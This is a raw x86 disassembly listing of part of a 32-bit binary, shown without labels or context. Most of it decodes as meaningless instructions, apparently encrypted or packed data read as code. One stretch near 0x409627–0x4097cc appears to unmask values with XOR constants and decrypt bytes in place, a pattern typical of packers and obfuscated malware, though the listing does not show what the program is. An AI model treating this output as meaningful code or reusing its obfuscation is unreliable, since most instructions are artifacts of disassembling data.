  4093df:	mov    bh,BYTE PTR [esi+0x7e8ac020]
  4093e5:	leave  
  4093e6:	inc    esp
  4093e7:	adc    BYTE PTR [ecx],bl
  4093e9:	jo     0x40940b
  4093eb:	sub    DWORD PTR [ecx],esi
  4093ed:	repz push edi
  4093ef:	cdq    
  4093f0:	sub    ebx,ebp
  4093f2:	mov    ds:0xc5452a97,al
  4093f7:	std    
  4093f8:	pop    esi
  4093f9:	js     0x4093d0
  4093fb:	sub    BYTE PTR [ebp-0x52cdbc9f],ch
  409401:	ins    DWORD PTR es:[edi],dx
  409402:	dec    ebp
  409403:	sub    DWORD PTR [edx-0x211c16ce],esp
  409409:	push   esi
  40940a:	imul   esi,ebx,0xffffffd7
  40940d:	inc    edx
  40940e:	mov    edi,DWORD PTR [eax]
  409410:	lods   eax,DWORD PTR ds:[esi]
  409411:	sub    DWORD PTR [ebx+eiz*2],esp
  409414:	int3   
  409415:	push   cs
  409416:	jb     0x4093d8
  409418:	std    
  409419:	lock push cs
  40941b:	or     al,0xd4
  40941d:	scas   al,BYTE PTR es:[edi]
  40941e:	sbb    bh,BYTE PTR [ebp*1+0x3ccf8935]
  409425:	or     eax,0xcdeda8db
  40942a:	lahf   
  40942b:	arpl   WORD PTR [edx-0x415de0f8],bp
  409431:	sub    eax,0x4920bd4e
  409436:	aad    0x96
  409438:	stc    
  409439:	test   al,0xdd
  40943b:	clc    
  40943c:	out    dx,eax
  40943d:	inc    ecx
  40943e:	xchg   esi,eax
  40943f:	and    ebx,DWORD PTR [ecx]
  409441:	in     eax,dx
  409442:	cmp    esi,esi
  409444:	xchg   edi,eax
  409445:	mov    ch,0x52
  409447:	popf   
  409448:	xchg   esp,eax
  409449:	js     0x40944a
  40944b:	push   es
  40944c:	sbb    al,0xdb
  40944e:	jno    0x4094c4
  409450:	inc    edx
  409451:	loope  0x409439
  409453:	mov    al,ds:0x654d284
  409458:	inc    edx
  409459:	jns    0x4094d4
  40945b:	out    0x76,eax
  40945d:	ficomp DWORD PTR [ebx]
  40945f:	rcr    BYTE PTR [edi+0x3f],cl
  409462:	push   esi
  409463:	jp     0x40943a
  409465:	call   0x164c6312
  40946a:	mov    DWORD PTR [ebp+0x6b],ebx
  40946d:	ja     0x4094b8
  40946f:	popf   
  409470:	les    esi,FWORD PTR [edi]
  409472:	pop    ss
  409473:	imul   edx,eax,0x3c2ab67e
  409479:	jo     0x4093fd
  40947b:	lea    esp,[edi+ebx*1-0x26]
  40947f:	in     al,0x41
  409481:	into   
  409482:	ss pop edx
  409484:	aad    0x68
  409486:	fidiv  WORD PTR [edi]
  409488:	mov    al,0x8c
  40948a:	or     BYTE PTR [esi],0x66
  40948d:	push   esi
  40948e:	mov    ch,BYTE PTR [edi+0x8]
  409491:	fwait
  409492:	push   0x8
  409494:	fcomp  QWORD PTR [ebp-0x6f]
  409497:	adc    DWORD PTR [edi-0x4bfbd72],0x7ec3d4de
  4094a1:	imul   eax,DWORD PTR ds:0xd54dba10,0x3bdc64a3
  4094ab:	jo     0x4094c5
  4094ad:	fcomp  QWORD PTR [esi]
  4094af:	aaa    
  4094b0:	push   DWORD PTR [eax+edi*1+0xac1a584]
  4094b7:	jl     0x40952a
  4094b9:	pop    esp
  4094ba:	out    dx,al
  4094bb:	(bad)  
  4094bc:	push   ebp
  4094bd:	add    eax,0xc4bae6ab
  4094c2:	pop    esi
  4094c3:	cmp    al,0xea
  4094c5:	out    0x2a,al
  4094c7:	sbb    al,0xf9
  4094c9:	and    ebp,ebx
  4094cb:	sti    
  4094cc:	xor    BYTE PTR [edi+edi*4-0x756474ad],0xa1
  4094d4:	or     bh,BYTE PTR [edi-0x41]
  4094d7:	pop    esp
  4094d8:	and    DWORD PTR [ebx+0x72bbedd7],eax
  4094de:	cli    
  4094df:	push   0x918fb1f0
  4094e4:	mov    ds:0x30bb0292,al
  4094e9:	(bad)  
  4094ea:	sbb    al,0x81
  4094ec:	loop   0x40951b
  4094ee:	(bad)  
  4094ef:	dec    ebx
  4094f0:	pop    eax
  4094f1:	mov    BYTE PTR [esi+eiz*8+0x4f],bl
  4094f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094f6:	mov    cl,0xde
  4094f8:	ds loopne 0x40956d
  4094fb:	cmc    
  4094fc:	fld    TBYTE PTR [ecx+0x13]
  4094ff:	lds    ecx,FWORD PTR ds:0x8943c317
  409505:	dec    eax
  409506:	push   ecx
  409507:	add    al,0x94
  409509:	dec    esp
  40950a:	fisttp QWORD PTR [esi]
  40950c:	sub    BYTE PTR [ecx+0x279b68ea],0x46
  409513:	(bad)  
  409514:	cli    
  409515:	and    BYTE PTR [esi*8+0x5124e1b],bh
  40951c:	scas   eax,DWORD PTR es:[edi]
  40951d:	imul   edi,DWORD PTR [ebp+edx*4+0x13],0x1c
  409522:	loop   0x4094cf
  409524:	div    BYTE PTR [esi+edx*2+0x73689bd2]
  40952b:	jb     0x4094d9
  40952d:	inc    edi
  40952e:	aam    0x56
  409530:	xor    DWORD PTR [edx+0x2b],esi
  409533:	aas    
  409534:	mov    BYTE PTR [ecx+0x365994a],bh
  40953a:	loopne 0x409520
  40953c:	(bad)
  409540:	mov    dl,0xff
  409542:	imul   eax,DWORD PTR [eax+0x59],0xffffffad
  409546:	add    edx,DWORD PTR [ebx+edx*4]
  409549:	or     al,0x10
  40954b:	dec    edi
  40954c:	dec    ecx
  40954d:	shl    DWORD PTR [eax],cl
  40954f:	xchg   edx,eax
  409550:	mov    DWORD PTR [esi+edi*8],eax
  409553:	(bad)  [eax-0x29]
  409556:	push   0xffffff91
  409558:	inc    edx
  409559:	mov    eax,0x6930e0d9
  40955e:	jge    0x40955f
  409560:	lods   eax,DWORD PTR ds:[esi]
  409561:	mov    dh,0xaa
  409563:	cwde   
  409564:	mov    WORD PTR [ebx],?
  409566:	(bad)  
  409567:	into   
  409568:	jo     0x4095c3
  40956a:	xchg   ebp,eax
  40956b:	mov    cl,0xb4
  40956d:	push   esi
  40956e:	and    esi,esp
  409570:	outs   dx,DWORD PTR ds:[esi]
  409571:	icebp  
  409572:	rcr    BYTE PTR [eax+ebp*1-0x3d615978],0x6b
  40957a:	mov    edi,0x9872f9bb
  40957f:	jmp    0x409512
  409581:	and    DWORD PTR [esi-0x36],esp
  409584:	scas   al,BYTE PTR es:[edi]
  409585:	test   al,0x75
  409587:	adc    ebx,DWORD PTR [ecx+0x380028fc]
  40958d:	push   ecx
  40958e:	xchg   ebx,eax
  40958f:	inc    ebx
  409590:	imul   ebp,edx,0x50
  409593:	jae    0x4095a8
  409595:	fidivr DWORD PTR [ecx+0x2d]
  409598:	xchg   ecx,eax
  409599:	adc    al,0x3e
  40959b:	pop    ecx
  40959c:	and    bh,BYTE PTR ds:0x8e3fc180
  4095a2:	fadd   DWORD PTR [ebx+eiz*2]
  4095a5:	scas   al,BYTE PTR es:[edi]
  4095a6:	mov    ecx,0x99ed90bc
  4095ab:	sub    dh,BYTE PTR [ecx]
  4095ad:	xchg   edx,eax
  4095ae:	cmc    
  4095af:	adc    bl,BYTE PTR [edx]
  4095b1:	mov    BYTE PTR [ebx],ch
  4095b3:	mov    cl,0xe9
  4095b5:	hlt    
  4095b6:	enter  0xd20a,0xc0
  4095ba:	leave  
  4095bb:	xchg   esp,eax
  4095bc:	xchg   edx,eax
  4095bd:	(bad)  
  4095be:	jns    0x40957b
  4095c0:	mov    esp,DWORD PTR ds:0xd556f88a
  4095c6:	ds pop esp
  4095c8:	std    
  4095c9:	sub    ecx,DWORD PTR [ebx]
  4095cb:	test   al,0x43
  4095cd:	loop   0x409559
  4095cf:	dec    edx
  4095d0:	inc    edx
  4095d1:	popa   
  4095d2:	(bad)  
  4095d3:	pop    ebp
  4095d4:	inc    edi
  4095d5:	and    dh,cl
  4095d7:	inc    ebx
  4095d8:	xor    dl,BYTE PTR [ebx+0x58]
  4095db:	fadd   DWORD PTR [edx-0x2079c2e6]
  4095e1:	fimul  WORD PTR [eax-0x4e72bd68]
  4095e7:	and    ebp,DWORD PTR [ebx-0x7dee22bc]
  4095ed:	jo     0x40966b
  4095ef:	cld    
  4095f0:	ds ret 
  4095f2:	push   ebp
  4095f3:	pusha  
  4095f4:	xchg   ecx,eax
  4095f5:	add    esp,DWORD PTR [esp+eiz*8+0x243dc791]
  4095fc:	pop    es
  4095fd:	push   esi
  4095fe:	ds cld 
  409600:	adc    eax,0xd16ebad
  409605:	mov    esi,0x6d7f5f3c
  40960a:	sbb    ecx,DWORD PTR [esi+0x65ee5658]
  409610:	das    
  409611:	jecxz  0x409626
  409613:	iret   
  409614:	jno    0x409664
  409616:	leave  
  409617:	scas   eax,DWORD PTR es:[edi]
  409618:	cmc    
  409619:	stos   DWORD PTR es:[edi],eax
  40961a:	xchg   ebx,eax
  40961b:	adc    al,0xdf
  40961d:	jl     0x4095a5
  40961f:	and    DWORD PTR ds:0x2a889bc1,0xffffffab
  409626:	inc    ebp
  409627:	pop    esp
  409628:	sahf   
  409629:	loopne 0x40964b
  40962b:	mov    edx,DWORD PTR [esi]
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x4225c8
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0x56bca5c6
  4097de:	leave  
  4097df:	inc    edi
  4097e0:	push   0x47
  4097e2:	inc    ecx
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    bh,al
  4097ea:	lahf   
  4097eb:	aam    0x26
  4097ed:	nop
  4097ee:	push   edx
  4097ef:	ss das 
  4097f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097f2:	inc    edx
  4097f3:	sub    al,0xdd
  4097f5:	jno    0x4097c9
  4097f7:	push   esi
  4097f8:	jmp    0x9a9b8cfd
  4097fd:	xchg   BYTE PTR [ebx],bl
  4097ff:	cmc    
  409800:	into   
  409801:	hlt    
  409802:	sbb    bl,al
  409804:	mov    esi,0xe910c676
  409809:	fmul   QWORD PTR [ebx]
  40980b:	inc    esp
  40980c:	or     eax,0x93400f29
  409811:	or     BYTE PTR [edx+0x7e],0xe5
  409815:	push   esi
  409816:	pop    ebp
  409817:	(bad)  
  40981a:	sub    ah,BYTE PTR [edx]
  40981c:	pop    esi
  40981d:	dec    ebp
  40981e:	je     0x409809
  409820:	call   0xce2a:0xcb6c446d
  409827:	arpl   bp,dx
  409829:	push   cs
  40982a:	inc    esp
  40982b:	mov    ecx,0x70c3e172
  409830:	stos   BYTE PTR es:[edi],al
  409831:	inc    esi
  409832:	repnz mov dl,BYTE PTR [eax-0x297ef096]
  409839:	mov    bh,0xd6
  40983b:	sbb    BYTE PTR [edx-0x55554e7e],dl
  409841:	ret    
  409842:	mul    DWORD PTR [edx+0x7]
  409845:	dec    ebp
  409846:	repz ror BYTE PTR [edx-0x59],cl
  40984a:	push   ds
  40984b:	loopne 0x40982b
  40984d:	mov    bh,0x3
  40984f:	(bad)  
  409850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409851:	push   esi
  409852:	(bad)  
  409854:	inc    esi
  409855:	mov    bh,BYTE PTR [ebx+0x2c0063a]
  40985b:	repz cwde 
  40985d:	ins    DWORD PTR es:[edi],dx
  40985e:	dec    ebx
  40985f:	sub    edx,DWORD PTR [edx+0x7c8f6f0c]
  409865:	ror    ebx,1
  409867:	clc    
  409868:	lds    ecx,FWORD PTR [edx+edi*4-0x2b]
  40986c:	jmp    0x99ce979b
  409871:	ss mov dl,0xd9
  409874:	pop    edx
  409875:	push   0x74
  409877:	push   0xffffffe2
  409879:	xor    eax,0xfe67b62b
  40987e:	fs ss jg 0x409870
  409882:	pop    ecx
  409883:	inc    edi
  409884:	ja     0x40984d
  409886:	out    0xe7,al
  409888:	in     al,0x3
  40988a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40988b:	lods   al,BYTE PTR ds:[esi]
  40988c:	ins    BYTE PTR es:[edi],dx
  40988d:	and    al,0xfa
  40988f:	push   esi
  409890:	inc    esp
  409891:	inc    eax
  409892:	jg     0x409904
  409894:	int    0xec
  409896:	call   0x31c1:0x8b4878e9
  40989d:	xor    edx,DWORD PTR [eax]
  40989f:	jmp    0xe1d90266
  4098a4:	inc    eax
  4098a5:	bound  esp,QWORD PTR [esp+eax*1+0x5ddf3a58]
  4098ac:	mov    al,0xbe
  4098ae:	fs jbe 0x40988f
  4098b1:	shl    BYTE PTR [eax],0xa8
  4098b4:	ret    0x370d
  4098b7:	in     al,0x68
  4098b9:	les    esi,FWORD PTR [ebx]
  4098bb:	xchg   esi,eax
  4098bc:	inc    edi
  4098bd:	sub    ebp,DWORD PTR [edi+0x6a]
  4098c0:	xlat   BYTE PTR ds:[ebx]
  4098c1:	imul   edx,DWORD PTR [edi+0x27],0xfffffffa
  4098c5:	sbb    al,0x25
  4098c7:	push   ebx
  4098c8:	xor    esi,edi
  4098ca:	xor    BYTE PTR [edx-0x3e354910],bh
  4098d0:	push   ecx
  4098d1:	or     DWORD PTR [ebx+0x680a5175],ebp
  4098d7:	mov    esp,0x8cdd9f14
  4098dc:	in     al,dx
  4098dd:	lods   al,BYTE PTR ds:[esi]
  4098de:	les    edx,FWORD PTR [ebp-0x2fa93be3]
  4098e4:	sbb    edx,0xffffff81
  4098e7:	mov    cl,0xa9
  4098e9:	ficom  DWORD PTR [edi]
  4098ec:	call   0x36e6:0xcce45cb4
  4098f3:	daa    
  4098f4:	push   cs
  4098f5:	and    al,0xac
  4098f7:	dec    edi
  4098f8:	dec    ebx
  4098f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098fa:	xchg   esi,eax
  4098fb:	mov    dl,0x72
  4098fd:	std    
  4098fe:	hlt    
  4098ff:	push   eax
  409900:	jmp    0xbf3b029f
  409905:	cmp    DWORD PTR [edi-0x6c46f9d0],ecx
  40990b:	nop
  40990c:	pop    edx
  40990d:	mov    eax,0xe9e6348
  409912:	inc    edx
  409913:	int3   
  409914:	inc    ebx
  409915:	lods   eax,DWORD PTR ds:[esi]
  409916:	leave  
  409917:	(bad)  
  409918:	pop    esi
  409919:	enter  0x3d02,0xb2
  40991d:	xchg   BYTE PTR [ebp-0x37],dl
  409920:	les    ebx,FWORD PTR [ebx+0x7f5fc0e7]
  409926:	gs sahf 
  409928:	cli    
  409929:	xchg   ebp,eax
  40992a:	mov    ebx,0x3c78cbd1
  40992f:	xchg   esi,eax
  409930:	mov    esp,0x482d8eb3
  409935:	out    0x66,eax
  409937:	dec    esp
  409938:	push   ecx
  409939:	daa    
  40993a:	rcl    DWORD PTR [edx],0x54
  40993d:	pop    ebx
  40993e:	popa   
  40993f:	fcomp  DWORD PTR [ebx+ebp*8+0x135ab647]
  409946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409947:	and    edx,DWORD PTR [esi+0x5d11b59f]
  40994d:	pushf  
  40994e:	mov    esp,0xaf27eee8
  409953:	xor    ebp,edx
  409955:	fild   QWORD PTR [eax-0x49c6d97]
  40995b:	pop    ecx
  40995c:	das    
  40995d:	out    dx,al
  40995e:	repnz nop
  409960:	inc    edx
  409961:	inc    esp
  409962:	inc    edi
  409963:	(bad)  
  409964:	sti    
  409965:	ror    edi,cl
  409967:	dec    edi
  409968:	ds imul ebx,ebx,0x56f7ca04
  40996f:	mov    ebx,0x865c4297
  409974:	push   ebp
  409975:	pop    ebp
  409976:	and    al,0x14
  409978:	mov    ebp,0x851e5a80
  40997d:	mov    bl,0x31
  40997f:	mov    al,0x1f
  409981:	push   ecx
  409982:	jg     0x4099c5
  409984:	jne    0x4099ee
  409986:	jae    0x409917
  409988:	in     eax,dx
  409989:	push   ecx
  40998a:	cmp    BYTE PTR [edx+0x77],ch
  40998d:	ret    0x9fc8
  409990:	adc    eax,0x551a2856
  409995:	lds    edi,FWORD PTR [ebp+ebx*4-0x4]
  409999:	jecxz  0x409929
  40999b:	sbb    BYTE PTR [edx+ebp*4+0x2a],al
  40999f:	push   esi
  4099a0:	jne    0x409952
  4099a2:	add    eax,DWORD PTR [ecx-0x6f]
  4099a5:	mov    esp,0x377508d3
  4099aa:	adc    eax,0xa5fda2bc
  4099af:	pop    esp
  4099b0:	dec    edi
  4099b1:	add    DWORD PTR [edi+edx*4],0x2c
  4099b5:	and    ch,bl
  4099b7:	inc    ebx
  4099b8:	(bad)  
  4099b9:	jge    0x40993e
  4099bb:	mov    dl,ch
  4099bd:	push   edi
  4099be:	leave  
  4099bf:	mov    WORD PTR gs:[esi],gs
  4099c2:	es push ecx
  4099c4:	in     al,dx
  4099c5:	fisub  DWORD PTR [ecx]
  4099c7:	ja     0x409a16
  4099c9:	in     eax,0xe
  4099cb:	mov    BYTE PTR [edi],cl
  4099cd:	aas    
  4099ce:	add    eax,0xa598124a
  4099d3:	inc    esp
  4099d4:	test   al,0xe7
  4099d6:	retf   
  4099d7:	jmp    0x76d1:0x4f84e2d7
  4099de:	aam    0x7f
  4099e0:	and    DWORD PTR [eax],0x75
  4099e3:	call   0xcdc9:0x230c2405
  4099ea:	mov    ch,0x2c
  4099ec:	sub    edi,0xffffff89
  4099ef:	mov    ch,0x1c
  4099f1:	mov    ds:0x42e489c9,eax
  4099f6:	lods   al,BYTE PTR ds:[esi]
  4099f7:	push   ecx
  4099f8:	sbb    al,dl
  4099fa:	inc    ebx
  4099fb:	cmp    BYTE PTR [esi+0x61aa6e5c],bl
  409a01:	sbb    ch,BYTE PTR [ebx+0x41e05396]
  409a07:	xchg   ebx,eax
  409a08:	or     al,0x34
  409a0a:	iret   
  409a0b:	jne    0x4099af
  409a0d:	sub    cl,BYTE PTR [ecx]
  409a0f:	shl    BYTE PTR ds:0xb6a5ae92,1
  409a15:	xchg   ebp,eax
  409a16:	loop   0x4099fe
  409a18:	(bad)  [eax]
  409a1a:	xlat   BYTE PTR ds:[ebx]
  409a1b:	cmp    DWORD PTR [ebx+0x54],edi
  409a1e:	jge    0x409a00
  409a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a21:	add    ebp,ebx
  409a23:	rol    DWORD PTR [esi+ebp*8-0x6f],0xd
  409a28:	pop    ds
  409a29:	xchg   BYTE PTR [edx+0x1b19ba0a],cl
  409a2f:	sar    BYTE PTR [ebp-0x1370c37c],cl
  409a35:	adc    dl,ah
  409a37:	dec    eax
  409a38:	pop    es
  409a39:	cmp    cl,BYTE PTR [edi-0x7e85d3fb]
  409a3f:	xchg   ecx,eax
  409a40:	fidivr DWORD PTR [edi]
  409a42:	xor    eax,0xe0e90d6
  409a47:	jb     0x409a48
  409a49:	fdiv   QWORD PTR [esi-0x2ad3fc4f]
  409a4f:	js     0x4099e7
  409a51:	(bad)  [ebx-0x71c07d75]
  409a57:	and    BYTE PTR [esp+ecx*2+0x20],dl
  409a5b:	sbb    dl,cl
  409a5d:	pop    edx
  409a5e:	sar    BYTE PTR [ebx-0x23],1
  409a61:	cmp    DWORD PTR [eax],0xffffffc8
  409a64:	adc    eax,0x729e6ea3
  409a69:	sahf   
  409a6a:	pop    eax
  409a6b:	das    
  409a6c:	mov    cl,0x89
  409a6e:	xchg   edx,eax
  409a6f:	gs jg  0x409a8b
  409a72:	xor    DWORD PTR [esi+esi*2+0xb],0x61b7886
  409a7a:	push   ss
  409a7b:	aam    0x9e
  409a7d:	(bad)  ds:[edi+0x13]
  409a81:	aam    0x44
  409a83:	inc    edx
  409a84:	in     al,dx
  409a85:	cdq    
  409a86:	add    eax,0xb25b7f72
  409a8b:	repnz xchg edi,eax
  409a8d:	lds    ebx,FWORD PTR [ebx]
  409a8f:	arpl   WORD PTR [esi+0x5c40fd09],bx
  409a95:	js     0x409a1b
  409a97:	push   edi
  409a98:	or     ebx,DWORD PTR [ebx-0x511692d3]
  409a9e:	cmp    DWORD PTR [ecx+0x1095107b],esi
  409aa4:	jbe    0x409aa6
  409aa6:	xchg   edi,eax
  409aa7:	lods   al,BYTE PTR ds:[esi]
  409aa8:	jbe    0x409b01
  409aaa:	jg     0x409a69
  409aac:	or     BYTE PTR [esi+ecx*4+0xb],bh
  409ab0:	pop    es
  409ab1:	addr16 cs inc edx
  409ab4:	and    DWORD PTR [ebx+0x1e5201e2],0x51e22897
  409abe:	loope  0x409b2e
  409ac0:	jmp    0x2c7679f5
  409ac5:	fcmovu st,st(6)
  409ac7:	mov    dh,0x2f
  409ac9:	movups xmm1,xmm0
  409acc:	ins    DWORD PTR es:[edi],dx
  409acd:	mov    DWORD PTR [eax],ecx
  409acf:	retf   0xb22b
  409ad2:	nop
  409ad3:	pop    eax
  409ad4:	out    dx,al
  409ad5:	stc    
  409ad6:	pusha  
  409ad7:	int    0x43
  409ad9:	fisttp DWORD PTR [ebp-0x7bd12dc9]
  409adf:	out    0x88,eax
  409ae1:	sbb    edx,DWORD PTR [edi+eax*4-0x68]
  409ae5:	cmp    eax,ecx
  409ae7:	dec    ecx
  409ae8:	fnstsw WORD PTR [ecx-0x57860d31]
  409aee:	xlat   BYTE PTR ds:[ebx]
  409aef:	fisubr WORD PTR [edx-0x1a]
  409af2:	inc    eax
  409af3:	xor    eax,0xa0d93397
  409af8:	icebp  
  409af9:	and    DWORD PTR [edx+0x3fe452d6],ebx
  409aff:	pop    esp
  409b00:	mov    DWORD PTR [edx+0x70],eax
  409b03:	sub    eax,0x4df054c8
  409b08:	ds jmp 0x9d17:0x46e5d74c
  409b10:	sub    BYTE PTR [eax-0x6044602d],al
  409b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b17:	mov    bl,0xb5
  409b19:	adc    DWORD PTR [ecx-0x3d],edx
  409b1c:	add    al,BYTE PTR [eax+eax*2]
  409b1f:	test   BYTE PTR [ebp-0x248448d5],ah
  409b25:	dec    esp
  409b26:	call   0xcb1d:0xbc501e8e
  409b2d:	inc    ebx
  409b2e:	xchg   ebx,eax
  409b2f:	call   0x771b88a5
  409b34:	mov    WORD PTR [ebx-0x26287e55],gs
  409b3a:	int3   
  409b3b:	push   esi
  409b3c:	cmp    ebx,DWORD PTR [ecx-0x5c3093b1]
  409b42:	lgs    ebp,FWORD PTR [edx-0x7a500a9c]
  409b49:	mov    bl,0xa8
  409b4b:	push   ds
  409b4c:	pop    ebp
  409b4d:	test   BYTE PTR [ecx+0x63],0x80
  409b51:	push   ebp
  409b52:	pushf  
  409b53:	out    dx,eax
  409b54:	adc    al,dh
  409b56:	and    eax,0x30ba049a
  409b5b:	push   cs
  409b5c:	xchg   esp,eax
  409b5d:	or     eax,DWORD PTR [ebx+0x457db638]
  409b63:	xchg   esi,eax
  409b64:	push   esi
  409b65:	fmul   st(2),st
  409b67:	stc    
  409b68:	mov    ch,dh
  409b6a:	neg    BYTE PTR [edx+0x63]
  409b6d:	jle    0x409b5c
  409b6f:	push   ss
  409b70:	shl    DWORD PTR [esi],0xd5
  409b73:	shl    eax,cl
  409b75:	outs   dx,DWORD PTR ds:[esi]
  409b76:	add    DWORD PTR [eax],esi
  409b78:	outs   dx,BYTE PTR ds:[esi]
  409b79:	pop    esp
  409b7a:	push   cs
  409b7b:	rcr    ebp,0xb8
  409b7e:	cmp    eax,0x31c42b23
  409b83:	mov    bh,0x1f
  409b85:	outs   dx,BYTE PTR ds:[esi]
  409b86:	mov    al,0xb7
  409b88:	inc    esp
  409b89:	pop    ds
  409b8a:	mov    bl,0xe0
  409b8c:	mov    DWORD PTR [ebx+0x2a298efc],edx
  409b92:	stc    
  409b93:	or     bh,bh
  409b95:	cmp    eax,DWORD PTR [ebx+eiz*4]
  409b98:	adc    edx,DWORD PTR [ebx-0x5972b662]
  409b9e:	imul   ecx,DWORD PTR [edx],0x6f
  409ba1:	fsubr  DWORD PTR [ecx-0x3772882c]
  409ba7:	pop    ebx
  409ba8:	in     eax,0x7d
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
